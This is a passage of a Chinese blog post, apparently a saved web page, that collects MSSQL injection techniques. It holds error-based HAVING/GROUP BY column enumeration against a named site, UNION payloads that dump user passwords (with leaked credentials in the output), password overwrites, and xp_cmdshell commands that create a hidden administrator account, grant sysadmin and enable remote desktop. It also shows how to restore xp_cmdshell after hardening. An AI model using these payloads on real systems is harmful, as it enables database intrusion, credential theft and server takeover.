[master].[dbo].[xp_availablemedia]<br><br>———————————-<br>–列出指定目录的所有下一级子目录–<br>———————————-<br><br>EXEC [master].[dbo].[xp_subdirs] ‘c:\windows’<br><br>——————————<br>–列出当前错误日志的具体内容–<br>——————————<br><br>EXEC [master].[dbo].[xp_readerrorlog]<br><br>———————-<br>–列出当前计算机名称–<br>———————-<br><br>execute master..xp_getnetname<br><br>——————————–<br>-列出当前计算机的驱动器可用空间-<br>——————————–<br><br>execute master..xp_fixeddrives<br><br>========================<br>==列出服务器所有本地组==<br>========================<br><br>execute master..xp_enumgroups<br><br>======================<br>==获取MS SQL的版本号==<br>======================<br><br>execute master..sp_msgetversion<br><br>=========================================<br>==参数说明:目录名,目录深度,是否显示文件==<br>=========================================<br><br>execute master..xp_dirtree ‘c:’<br>execute master..xp_dirtree ‘c:’,1<br>execute master..xp_dirtree ‘c:’,1,1<br><br>=========================================<br>==列出服务器上安装的所有OLEDB提供的程序==<br>=========================================<br><br>execute master..xp_enum_oledb_providers<br><br>=========================<br>==列出服务器上配置的DNS==<br>=========================<br><br>execute master..xp_enumdsn<br><br>删除存储过程<br><br>drop PROCEDURE sp_addextendedproc<br><br>———————–<br>–删除sql危险存储过程–<br>———————–<br><br>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br>DROP PROCEDURE sp_makewebtask<br>exec master..sp_dropextendedproc xp_cmdshell<br>exec master..sp_dropextendedproc xp_dirtree<br>exec master..sp_dropextendedproc xp_fileexist<br>exec master..sp_dropextendedproc xp_terminate_process<br>exec master..sp_dropextendedproc sp_oamethod<br>exec master..sp_dropextendedproc sp_oacreate<br>exec master..sp_dropextendedproc xp_regaddmultistring<br>exec master..sp_dropextendedproc xp_regdeletekey<br>exec master..sp_dropextendedproc xp_regdeletevalue<br>exec master..sp_dropextendedproc xp_regenumkeys<br>exec master..sp_dropextendedproc xp_regenumvalues<br>exec master..sp_dropextendedproc sp_add_job<br>exec master..sp_dropextendedproc sp_addtask<br>exec master..sp_dropextendedproc xp_regread<br>exec master..sp_dropextendedproc xp_regwrite<br>exec master..sp_dropextendedproc xp_readwebtask<br>exec master..sp_dropextendedproc xp_makewebtask<br>exec master..sp_dropextendedproc xp_regremovemultistring<br>exec master..sp_dropextendedproc sp_OACreate<br>DROP PROCEDURE sp_addextendedproc<br>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br>xp_cmdshell新的恢复办法<br><br>扩展储存过程被删除以后可以有很简单的办法恢复：<br>删除<br>drop procedure sp_addextendedproc<br>drop procedure sp_oacreate<br>exec sp_dropextendedproc ‘xp_cmdshell’<br><br>恢复<br>dbcc addextendedproc (“sp_oacreate”,”odsole70.dll”)<br>dbcc addextendedproc (“xp_cmdshell”,”xplog70.dll”)<br><br>这样可以直接恢复，不用去管sp_addextendedproc是不是存在<br><br>删除扩展存储过过程xp_cmdshell的语句:<br>exec sp_dropextendedproc ‘xp_cmdshell’<br><br>恢复cmdshell的sql语句<br>exec sp_addextendedproc xp_cmdshell ,@dllname =’xplog70.dll’<br><br>开启cmdshell的sql语句<br><br>exec sp_addextendedproc xp_cmdshell ,@dllname =’xplog70.dll’<br><br>判断存储扩展是否存在<br>select count(<em>) from master.dbo.sysobjects where xtype=’x’ and name=’xp_cmdshell’<br>返回结果为1就ok<br><br>恢复xp_cmdshell<br>exec master.dbo.addextendedproc ‘xp_cmdshell’,’xplog70.dll’;select count(</em>) from master.dbo.sysobjects where xtype=’x’ and name=’xp_cmdshell’<br>返回结果为1就ok<br><br>否则上传xplog7.0.dll<br>exec master.dbo.addextendedproc ‘xp_cmdshell’,’c:\winnt\system32\xplog70.dll’<br><br>堵上cmdshell的sql语句<br>sp_dropextendedproc “xp_cmdshell<br><br>读3389端口<br>regedit /e port.reg “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp”<br>然后 type port.reg | find “PortNumber”<br>sql 语句<br>exec master..xp_regread ‘HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp’,’PortNumber’<br>declare @s varchar(4000) set @s=cast(0x65786563206D61737465722E2E78705F726567726561642027484B45595F4C4F43414C5F4D414348494E45272C2753595354454D5C43757272656E74436F6E74726F6C5365745C436F6E74726F6C5C5465726D696E616C205365727665725C57696E53746174696F6E735C5244502D546370272C27506F72744E756D62657227 as varchar(4000));exec(@s); –<br><br>开启2003的终端(sa)<br>xp_regwrite ‘HKEY_LOCAL_MACHINE’, ‘SYSTEM\CurrentControlSet\Control\Terminal Server’, ‘fDenyTSConnections’,’REG_DWORD’,’0’<br><br>exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;–</pre><br></div><br><span class="cnblogs_code_collapse">View Code</span></div><br>&nbsp;<br><br>&nbsp;<br><br><strong>SQL构造having语句暴字段</strong><br><div class="cnblogs_code"><img src="http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif" alt=""><br><div id="cnblogs_code_open_489ff84c-a400-419a-b479-8db1fb2bcdf5" class="cnblogs_code_hide"><br><pre>一、获得建立用户的表的名字和字段的名字；使用select语法的having子句。<br>‘’having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_id’’ 在选择列表中无效，因为该列未包含在聚合函数中，并且没有 GROUP BY 子句。<br>/football/reguser/check.asp，行26<br>成果：知道了表的名字reguser和第一个字段的名字reguser.reg_id。<br><br>二、通过字段放到group by子句找到字段名。<br>1、<br>‘’group by reguser.reg_id having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_name’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_name字段<br>2、<br>‘’group by reguser.reg_id,reguser.reg_name having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_password’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_password字段<br>3、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_relname’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_relname字段<br>4、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_regtime’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_regtime字段<br>5、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_findme’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_findme字段<br>6、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_city’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_city字段<br>7、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_qq’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_qq字段<br>8、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_icq’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_icq字段<br><br>9、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_msn’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_msn字段<br>10、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_phone’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_phone字段<br>11、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_class’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_class字段<br>12、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_money’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_money字段<br>13、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_regip’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_regip字段<br>14、<br><br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_Estar’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_Estar字段<br>15、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_Eend’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_Eend字段<br>16、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar,reguser.reg_Eend having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_changeuser’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_changeuser字段<br>17、<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar,reguser.reg_Eend,reguser.reg_changeuser having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_changetime’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_changetime字段<br>18<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar,reguser.reg_Eend,reguser.reg_changeuser,reguser.reg_changetime having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_logintime’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_logintime字段<br>19<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar,reguser.reg_Eend,reguser.reg_changeuser,reguser.reg_changetime,reguser.reg_logintime having 1=1–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>列 ‘’reguser.reg_online’’ 在选择列表中无效，因为该列既不包含在聚合函数中，也不包含在 GROUP BY 子句中。<br>/football/reguser/check.asp，行26<br>成果：得到了reguser.reg_online字段<br>20<br>‘’group by reguser.reg_id,reguser.reg_name,reguser.reg_password,reguser.reg_relname,reguser.reg_regtime,reguser.reg_findme,reguser.reg_city,reguser.reg_qq,reguser.reg_icq,reguser.reg_msn,reguser.reg_phone,reguser.reg_class,reguser.reg_money,reguser.reg_regip,reguser.reg_Estar,reguser.reg_Eend,reguser.reg_changeuser,reguser.reg_changetime,reguser.reg_logintime,reguser.reg_online having 1=1–<br><br>返回结果：<br>出现信息提示框；你还不是会员请注册<br>到这里一个表猜完。<br>三、确定列的类型。通过使用类型转化来实现：利用了SQLSERVER在确定两个结果集的字段是否相等前应用sum子句。<br>1、<br>‘’union select sum(reguser.reg_name) from reguser–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e07’’<br>sum or average aggregate 运算不能以 varchar 数据类型作为参数。<br>/football/reguser/check.asp，行26<br>成果：reguser.reg_name字段是数据类型varchar。<br>2、<br>‘’union select sum(reguser.reg_id) from reguser–<br><br>返回结果：<br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e14’’<br>包含 UNION 运算符的 SQL 语句中的所有查询都必须在目标列表中具有相同数目的表达式。<br>/football/reguser/check.asp，行26<br>四、insert查询：<br><br>‘’;insert into reguser values(666,’’attacker’’,’’foobar’’)–<br><br>五、<br>‘’union select  from reguser where reguser.reg_name=’’admin’’–<br>‘’;select  from reguser where reguser.reg_name=’’admin’’–<br><br>‘’;updata reguser set reguser.reg_password=’’36d201fb337dc23bde4d143491cfae4d’’ where reguser.reg_name=’’admin’’–<br>‘’union updata reguser set reguser.reg_password=’’36d201fb337dc23bde4d143491cfae4d’’ where reguser.reg_name=’’admin’’–<br><br>六、从reguser表中读取用户名：<br>‘’union select min(reguser.reg_name),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from reguser where reguser.reg_name&gt;’’a’’–<br>这句选择users表中username大于’’a’’中的最小值，并试图把它转化成一个整型数字：<br><br>收集密码：<br>‘’union select reguser.reg_password,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from reguser where reguser.reg_name&gt;’’admin’’–<br>‘’union select password,1,1,1 from users where username=’’admin’’–<br>13535701998<br><br>创建了一个foo表，里面只有一个单独的列’’ret’’，里面存放着得到的用户名和密码的字符串<br>‘’;begin declare @ret varchar(8000) set @ret=’’:’’ select @ret=@ret+’’ ‘’+reguser.reg_name+’’/‘’+reguser.reg_password from reguser where reguser.reg_name&gt;@ret select @ret as 1866574 into 1866574 end–<br><br>‘’union select ret,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from foo–<br><br>Microsoft OLE DB Provider for SQL Server 错误 ‘’80040e07’’<br>将 varchar 值 ‘’: 383838/989898 123456/234567 korea007/154085 风681168/13535701998 kyo327/woaini denglong/247986965’’ 转换为数据类型为 int 的列时发生语法错误。<br>/football/reguser/check.asp，行26<br><br>‘’;drop table foo–<br><br>admin’’;declare @o int,@ret int exec sp_oacreate ‘’speech.voicetext’’,@o out exec sp_oamethod @o,’’register’’,NULL,’’foo’’,’’bar’’ exec sp_oasetproperty @o,’’speed’’,150 exec sp_oamethod @o,’’speak’’,NULL,’’all your sequel servers are belong to us’’,528 waitfor delay ‘’00:00:05’’–<br><br>=-= 加帐号 =-=<br>‘’;Exec master..xp_cmdshell ‘’net user’’–<br><br>‘’;Exec master..xp_cmdshell ‘’net user jiaoniang$ 1866574 /add’’–<br>‘’;Exec master..xp_cmdshell ‘’net localGroup Administrators jiaoniang$ /add’’–<br><br>‘’;exec master..sp_addlogin jiaoniang$,1866574–<br>‘’;exec master..sp_addsrvrolemember jiaoniang$,sysadmin–<br><br>‘’;exec xp_regread HKEY_LOCAL_MACHINE,’’SYSTEM\CurrentControlSet\Services\lanmanserver\parameters’’,’’nullsessionshares’’–<br><br>=-= 开服务 =-=<br>‘’;Exec master..xp_cmdshell ‘’net stat telnet’’–<br>‘’;Exec master..xp_cmdshell ‘’net stat server’’–<br><br>=-= 开3389 =-=<br>‘’;Exec master..xp_cmdshell “echo [Components] &gt; c:\1866574”–<br>//在c盘根目录建写入一个文件<br>‘’;Exec master..xp_cmdshell “echo TsEnable = on &gt;&gt; c:\1866574”–<br>//追加写入<br>‘’;Exec master..xp_cmdshell “sysocmgr /i:c:\windows\inf\sysoc.inf /u:c:\1866574 /q”–<br>//开3389，成功的话过会肉机会重启！！</pre><br></div><br><span class="cnblogs_code_collapse">View Code</span></div><br>&nbsp;<br><br>&nbsp;<br><br><strong>sysobjects表无select权限时暴表</strong><br><div class="cnblogs_code"><img src="http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif" alt=""><br><div id="cnblogs_code_open_f972afc3-ea22-4181-8260-fb2644a5e8d7" class="cnblogs_code_hide"><br><pre>所有的表名都只存在了sysobjects表里，所以我们无法从别的地方得到表名。<br><br>但是，大家有没注意过sql server提供的object_name函数呢？<br>它与object_id函数是相对应的，object_id会返回指定对象在数据库中的id值。<br><br>而object_name会返回指定ID所对应的数据库对象名，对于表来说自然就是表名了。<br><br>好了，现在只要得到所有的用户表的ID就可以得到表名了， 表的ID在很多地方都会存储，比如syscolumns表，<br>我们只要从syscolumns表里面取得表的ID，再利用object_name就可以得到表名了。<br><br>下面是测试代码：<br><br>declare @id int<br>select @id = 1<br>declare @sql varchar(100)<br>while @id &lt;= 200<br>begin<br>select @sql = ‘create table test’+ltrim(@id)+’(id int)’<br>exec(@sql)<br>select @id = @id +1<br>end<br><br>select distinct(object_name(id)) from syscolumns where object_name(id) not in(‘sysobjects’,’sysindexes’,’syscolumns’,’systypes’,<br>‘syscomments’,’sysfiles1’,’syspermissions’,’sysusers’,’sysproperties’,’sysdepends’,’sysreferences’,<br>‘sysfulltextcatalogs’,’sysindexkeys’,’sysforeignkeys’,’sysmembers’,’sysprotects’,<br>‘sysfulltextnotify’,’sysfiles’,’sysfilegroups’,’dt_addtosourcecontrol’,’dt_addtosourcecontrol_u’,<br>‘dt_adduserobject_vcs’,’dt_checkinobject’,’dt_checkinobject_u’,’dt_checkoutobject’,’dt_checkoutobject_u’,<br>‘dt_displayoaerror’,’dt_displayoaerror_u’,’dt_droppropertiesbyid’,’dt_dropuserobjectbyid’,’dt_generateansiname’,<br>‘dt_getobjwithprop’,’dt_getobjwithprop_u’,’dt_getpropertiesbyid’,’dt_getpropertiesbyid_u’,’dt_getpropertiesbyid_vcs’,<br>‘dt_getpropertiesbyid_vcs_u’,’dt_isundersourcecontrol’,’dt_isundersourcecontrol_u’,’dt_setpropertybyid’,<br>‘dt_setpropertybyid_u’,’dt_validateloginparams’,’dt_validateloginparams_u’,’dt_whocheckedout’,’dt_whocheckedout_u’,<br>‘dtproperties’,’sysconstraints’,’syssegments’)<br><br>代码在SQL SERVER 2000下测试通过。<br><br>先来抓包看一个PANGOLIN的暴列名的语句 ，十分经典：<br>SQL代码<br>   1. GET /sql.asp?id=1 and (select top 1 cast(id as nvarchar(20))+char(124)  from [pubs]..[sysobjects] where name=0x4400390039005f0054006d007000)=0– 取得要暴列名的表的ID<br>   2.<br>   3. GET /sql.asp?id=1 and (select cast(count(1) as varchar(10))+char(94) from [pubs]..[syscolumns] where id=757577737)=0– 得到此表的列的数量<br>   4.<br>   5. GET /sql.asp?id=1 and (select top 1 cast(name as varchar(8000)) from (select top 1 colid,name from [pubs]..[syscolumns] where id=757577737 order by colid) t order by colid desc)=0– 开始从syscolumns里面报列名了。<br><br>其它的注入工具也大同小异，都是从syscolumns里面取得列名。<br><br>当我们无法从syscolumns表里面取得数据该怎么办？比如我们没有syscolumns表的select权限。<br><br>下面就是文章的重点了，其实说白了也就是一个函数的应用 ：<br>SQL代码<br><br>   1. select 1 where 1=(select isnull(col_name(object_id(‘admin’),3),’meiyoucilie’))<br><br>上面这条语句表示得到admin表的第三个列的名称，并与1进行比较，结果肯定是会报错的，通过报错结果我们就可以将第三列的名字暴出来了，没有用到syscolumns表哦。<br><br>用到的是col_name函数，它有两个参数，第一个就是表的ID，第二个就是列的索引。这个索引是从1开始的。<br>如果指定索引的号不存在。 比如admin表里面一共才三个列，结果索引传了个4进去 ，就会报错说”meiyoucilie”</pre><br></div><br><span class="cnblogs_code_collapse">View Code</span></div>
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+    <section id="comment">
+        <div class="card">
+            <div class="card-content">
+                <!-- Duoshuo Comment BEGIN -->
+                <div class="ds-thread" data-thread-key="2015-04-25-mssql-e6-b3-a8-e5-85-a5.html" data-title="mssql 注入" data-url="http://www.linux52.com/2015-04-25-mssql-e6-b3-a8-e5-85-a5.html"></div>
+
+                <script type="text/javascript">
+                    console.log(document.querySelector('.ds-thread'));
+                    var duoshuoQuery = {
+                        short_name: 'hacksw'
+                    };
+                    (function() {
+                        var ds = document.createElement('script');
+                        ds.type = 'text/javascript';
+                        ds.async = true;
+                        ds.src = (document.location.protocol == 'https:'
+                            ? 'https:'
+                            : 'http:') + '//static.duoshuo.com/embed.js';
+                        ds.charset = 'UTF-8';
+                        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds);
+                    })();
+                </script>
+                <!-- Duoshuo Comment END -->
+            </div>
+        </div>
+    </section>
+
+
+
+</div>
+
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large green">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect blue" title="回到顶部"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse orange"  data-activates="main-menu" title="menu"><i class="fa fa-navicon"></i></a></li>
+    </ul>
+  </div>
+
+    </main>
+    <footer class="page-footer indigo darken-1">
+    
+    <div class="container">
+        <div class="row">
+            
+            <div class="social-group col m3 s12">
+                <h5 class="white-text">社交</h5>
+                
+                    <a class="social-link" href="http://weibo.com/" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="https://github.com/" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+            </div>
+            
+
+            
+            <div class="col m9 s12">
+                <h5 class="white-text">友情链接</h5>
+                
+                    <a class="social-link" href="http:www.linux52.com" target="_blank">主题</a>
+                
+                    <a class="social-link" href="https://github.com/" target="_blank">github</a>
+                
+                    <a class="social-link" href="http://www.5cc.xyz" target="_blank">老博客</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+
+    <div class="footer-copyright indigo-link-context">
+        <div class="container">
+            © 2016 www.linux52.com, All rights reserved.
+            <p class="right" style="margin-top: 0;">本博客由 <a href="http://www.linux52.com">home</a> 强力驱动 | 主题 <a href="https://github.com/">TEST</a></p>
+        </div>
+    </div>
+</footer>
+
+
+    <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass('green lighten-2');
+
+            
+            // 添加new标签
+            $('.menu-reading, .menu-about').append('<span class="new badge pink"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
